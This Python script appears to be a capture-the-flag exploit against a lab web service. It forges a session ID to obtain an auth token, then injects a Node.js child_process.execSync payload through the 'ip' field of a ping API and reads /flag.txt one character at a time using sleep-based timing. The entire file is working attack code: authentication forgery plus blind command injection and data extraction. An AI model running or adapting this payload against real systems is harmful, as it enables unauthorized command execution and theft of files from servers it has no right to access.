import subprocess
import requests
import random
import string
import json
import time

# Function to generate a valid SID
def generate_sid(uid):
    random_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    checksum = hex(sum(ord(c) for c in random_chars))[2:]  # Calculate checksum and convert to hex
    return uid + random_chars + checksum

# Function to perform authentication
def authenticate():
    # Define URLs
    auth_url = "http://94.237.51.127:35539/api/auth/authenticate"
    # Define UID and Email
    uid = "testuser"
    email = "testuser@example.com"
    # Generate a valid SID
    sid = generate_sid(uid)
    print(f"Generated SID: {sid}")
    # Create payload for authentication
    auth_payload = json.dumps({'uid': uid, 'sid': sid, 'email': email})
    # Authentication request
    auth_command = [
        "curl", "-X", "POST", auth_url,
        "-H", "Content-Type: application/json",
        "-d", auth_payload
    ]
    # Execute the authentication command
    auth_result = subprocess.run(auth_command, capture_output=True, text=True)
    auth_response = json.loads(auth_result.stdout)
    # Check authentication response
    if auth_result.returncode == 0 and 'token' in auth_response:
        return auth_response.get('token')
    else:
        print("Authentication failed.")
        return None

# Function to test payloads with varying head values
def test_payload(token):
    # Define the character set
    characters = string.ascii_letters + string.digits + string.punctuation
    ping_url = "http://94.237.51.127:35539/api/service/ping"
    
    for head_value in range(1, 26):  # Loop through head values from 1 to 25
        print(f"Testing head -c {head_value}")

        for character in characters:
            # Escape single quotes and backslashes in the character
            escaped_character = character.replace("\\", "\\\\").replace("'", "\\'")

            # Create the payload for the ping endpoint with the current character
            payload = f'{{"ip":"127.0.0.1"}}\').ip + require(\'child_process\').execSync(\'cat /flag.txt | head -c {head_value} | tail -c 1 | {{ read c; if [ "$c" = "{escaped_character}" ]; then sleep 10; fi; }}\')//"}}'
            print(f"Testing payload: {payload}")

            # Define the curl command for the ping request
            ping_command = [
                "curl", "-X", "POST", ping_url,
                "-H", "Content-Type: application/json",
                "-H", f"Authorization: Bearer {token}",
                "-d", json.dumps({"external": "true", "ip": payload})
            ]

            # Measure the response time
            start_time = time.time()
            ping_result = subprocess.run(ping_command, capture_output=True, text=True)
            end_time = time.time()

            response_time = end_time - start_time
            print(f"Payload Response Status Code: {ping_result.returncode}")
            print(f"Payload Response Body: {ping_result.stdout}")
            print(f"Response Time: {response_time:.2f} seconds")

            # Check if the response time indicates a delay
            if response_time >= 10:  # Adjust the threshold as needed
                print(f"Character causing delay: {character} with head -c {head_value}")
                # Save the character to delay.txt
                with open("delay.txt", "a") as file:
                    file.write(f"{character} with head -c {head_value}\n")
                # No need to test further characters for this head_value, move to the next head_value
                break

# Perform authentication
token = authenticate()
if token:
    # Start testing payloads with varying head values
    test_payload(token)
else:
    print("Authentication failed.")
